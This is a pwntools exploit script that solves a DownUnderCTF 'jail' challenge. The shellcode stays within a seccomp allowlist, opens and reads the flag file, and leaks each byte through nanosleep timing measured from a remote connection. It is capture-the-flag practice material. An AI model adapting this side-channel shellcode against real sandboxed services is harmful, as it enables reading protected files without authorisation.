#!usr/bin/python3
from pwn import *
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './jail'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = '2023.ductf.dev', 30010
local = True

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        local = False
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+197
'''.format(**locals())
# =========================================================
#                         EXPLOITS
# =========================================================
'''
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000023  if (A == nanosleep) goto 0009
 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009
 0008: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
'''

def generate_shellcode(idx):
    shellcode = shellcraft.openat(-1, '/chal/flag.txt')
    shellcode += shellcraft.read('rax', 'rsp', 64)
    
    # nanosleep(struct timespec time, null)
    # struct timespec {
    #   .tv_sec  = byte [rsp + i] / 10
    #   .tv_nsec = (byte [rsp + i] % 10) * 100000000
    # }
    # rsp     -> tv_sec -> seconds
    # rsp + 8 -> tv_nsec -> nseconds
    # 1 second is 1,000,000,000 nanosecond
    
    # load flag[idx]
    if idx == 0xa:
        shellcode += f'''
        add r12, {idx};
        mov al, byte [rsp + r12];
        '''
    else: 
        shellcode += f'''
        mov al, byte [rsp + {idx}];
        '''
        
    # adjusting struct timespec  
    shellcode += f'''
    ; # rax / rbx
    ; # result stored in rax
    ; # remainder stored in rdx
    mov rbx, 9;
    inc rbx; # for some reason assembly doesnt like 0x0a (perhaps its a new line and it would terminate out input)
    xor rdx, rdx; # if not, assembly arithmetic exception
    div rbx;
    
    ; # store result, used for .tv_sec
    mov rbx, rax;
    ; # adjust to nanosecond
    mov rax, 100000000;
    ; # rdx * rax = stored in rax
    mul rdx;
    
    ; # .tv_sec
    push rax;
    ; # .tv_nsec
    push rbx;
    '''
    
    shellcode += shellcraft.nanosleep('rsp', 0)
    shellcode += shellcraft.exit(0)
    
    return asm(shellcode)

flag = ['D', ]
idx = 0
while flag[-1] != "}":
    io = initialize()
    sc = generate_shellcode(idx)

    info('shellcode length: %d', len(sc))
    assert(len(sc) <= 127)

    start = time.time()
    
    io.sendlineafter(b'>', sc)
    io.recvall()

    end = time.time() - start
    log.info('time taken = %s', end)
    
    res = chr(int(end * 10))
    flag.append(res)
    info(f'flag[{idx}] = "{res}"')
    
    idx += 1
    
log.success(''.join(flag))